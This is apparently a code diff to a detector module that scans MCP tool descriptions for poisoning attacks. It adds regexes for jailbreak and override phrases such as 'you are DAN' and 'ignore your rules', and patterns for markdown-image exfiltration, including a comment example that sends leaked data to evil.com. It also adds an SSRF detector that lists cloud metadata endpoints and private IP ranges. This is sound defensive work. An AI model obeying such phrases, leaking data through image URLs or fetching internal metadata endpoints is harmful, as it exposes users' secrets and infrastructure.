@@ -1,14 +1,15 @@
 """
 MCP Tool Poisoning Attack Pattern Detectors
 
-Detects 7 categories of tool description poisoning attacks:
-1. Prompt Injection
-2. Data Exfiltration
+Detects 8 categories of tool description poisoning attacks:
+1. Prompt Injection (incl. jailbreak patterns)
+2. Data Exfiltration (incl. markdown image exfil)
 3. Cross-Tool Manipulation
 4. Invisible Characters
 5. Obfuscated Payloads
 6. Description Anomalies
 7. Dangerous Commands
+8. SSRF / Internal Access
 """
 
 import re
@@ -71,6 +72,18 @@ PROMPT_INJECTION_PATTERNS = [
     r"without\s+the\s+user\s+knowing",
     r"before\s+responding\s+to\s+the\s+user",
     r"after\s+every\s+response",
+    # Jailbreak patterns (DAN, roleplay, persona hijacking)
+    r"you\s+are\s+DAN\b",
+    r"Do\s+Anything\s+Now",
+    r"act\s+as\s+if\s+you\s+have\s+no\s+restrictions",
+    r"pretend\s+you\s+(are|have)\s+(no|unrestricted)",
+    r"enter\s+(developer|debug|god|admin)\s+mode",
+    r"enable\s+(developer|debug|god|admin)\s+mode",
+    r"jailbreak",
+    r"bypass\s+(your|all|safety|content)\s+(filters?|restrictions?|guidelines?|rules?)",
+    r"ignore\s+(your|all|safety|content)\s+(filters?|restrictions?|guidelines?|rules?)",
+    r"from\s+now\s+on\s+you\s+(will|must|should|are)",
+    r"respond\s+without\s+(any\s+)?(restrictions?|filters?|limitations?)",
 ]
 
 
@@ -115,9 +128,16 @@ DATA_EXFIL_PHRASE_PATTERNS = [
     r"callback\s*url",
     r"report\s+back\s+to",
     r"phone\s+home",
+    # Markdown image exfiltration (render an image URL with leaked data)
+    r"!\[.*?\]\(https?://",
+    r"render\s+(this|an?|the)\s+(image|img|markdown)",
+    r"display\s+(this|an?|the)\s+(image|img|markdown)",
+    r"include\s+(this|an?|the)\s+(image|img)\s+in\s+(your|the)\s+response",
+    r"\?\w*=(data|token|key|secret|session|cookie|credential|password|chat|history|context)",
 ]
 
 DATA_EXFIL_URL_PATTERN = r"https?://[^\s\"\'>]+"
+MARKDOWN_IMAGE_EXFIL_PATTERN = r"!\[[^\]]*\]\(https?://[^\)]+\)"
 
 
 def detect_data_exfiltration(tool_name: str, description: str) -> DetectionResult:
@@ -128,6 +148,11 @@ def detect_data_exfiltration(tool_name: str, description: str) -> DetectionResul
             phrase_matches.extend(matches)
 
     url_matches = re.findall(DATA_EXFIL_URL_PATTERN, description)
+
+    # Markdown image exfiltration: ![alt](https://evil.com/?d=LEAKED_DATA)
+    md_image_matches = re.findall(MARKDOWN_IMAGE_EXFIL_PATTERN, description)
+    if md_image_matches:
+        phrase_matches.append(f"markdown_image_exfil:{md_image_matches[0][:60]}")
 
     if phrase_matches:
         severity = 90
@@ -420,6 +445,60 @@ def detect_dangerous_commands(tool_name: str, description: str) -> DetectionResu
     )
 
 
+# --- Detector 8: SSRF / Internal Access ---
+
+SSRF_PATTERNS = [
+    # Cloud metadata endpoints
+    r"169\.254\.169\.254",
+    r"metadata\.google\.internal",
+    r"metadata\.azure\.com",
+    r"100\.100\.100\.200",  # Alibaba Cloud metadata
+    # Localhost / loopback
+    r"https?://localhost[:/]",
+    r"https?://127\.0\.0\.1",
+    r"https?://0\.0\.0\.0",
+    r"https?://\[::1\]",
+    # Private IP ranges
+    r"https?://10\.\d{1,3}\.\d{1,3}\.\d{1,3}",
+    r"https?://172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}",
+    r"https?://192\.168\.\d{1,3}\.\d{1,3}",
+    # Internal service patterns
+    r"(visit|browse|fetch|access|request|open|navigate\s+to)\s+https?://(localhost|127\.0\.0\.1|10\.|172\.(1[6-9]|2\d|3[01])|192\.168|169\.254)",
+    r"\b(internal|admin|management)\s+(api|endpoint|service|server|panel|console)\b",
+    # Cloud provider internal services
+    r"/latest/meta-data",
+    r"/latest/api/token",
+    r"\.internal(\.|\b)",
+]
+
+
+def detect_ssrf(tool_name: str, description: str) -> DetectionResult:
+    matched_patterns = []
+    for pattern in SSRF_PATTERNS:
+        matches = re.findall(pattern, description, re.IGNORECASE)
+        if matches:
+            matched_patterns.extend(
+                [m if isinstance(m, str) else " ".join(m) for m in matches]
+            )
+
+    if matched_patterns:
+        return DetectionResult(
+            pattern_name="SSRF / Internal Access",
+            severity=85,
+            matched=True,
+            evidence=f"SSRF patterns found: {', '.join(repr(m) for m in matched_patterns[:5])}",
+            description="Tool description references internal networks, cloud metadata endpoints, or localhost — potential SSRF via AI browsing.",
+        )
+
+    return DetectionResult(
+        pattern_name="SSRF / Internal Access",
+        severity=85,
+        matched=False,
+        evidence="",
+        description="No SSRF or internal access patterns detected.",
+    )
+
+
 # --- All Detectors ---
 
 ALL_DETECTORS: List[PatternDetector] = [
@@ -430,4 +509,5 @@ ALL_DETECTORS: List[PatternDetector] = [
     PatternDetector("Obfuscated Payloads", "Detects base64, hex, and other obfuscated content", 70, detect_obfuscated_payloads),
     PatternDetector("Description Anomalies", "Detects structural anomalies in descriptions", 45, detect_description_anomalies),
     PatternDetector("Dangerous Commands", "Detects dangerous system commands and credential references", 80, detect_dangerous_commands),
+    PatternDetector("SSRF / Internal Access", "Detects SSRF attempts via internal IPs, cloud metadata, and localhost", 85, detect_ssrf),
 ]
